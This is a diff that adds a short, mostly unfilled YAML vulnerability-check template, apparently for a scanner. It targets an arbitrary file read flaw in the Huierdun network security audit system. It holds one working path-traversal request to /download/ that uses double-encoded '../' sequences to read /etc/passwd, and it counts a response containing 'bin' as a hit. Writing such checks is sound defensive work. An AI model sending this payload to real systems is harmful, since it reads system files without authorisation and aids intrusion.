@@ -1,0 +1,16 @@
+id:
+info:
+  name: 惠尔顿网络安全审计系统任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+response1:
+  headers:
+  body: bin
+  code:
+requests2:
+response2:
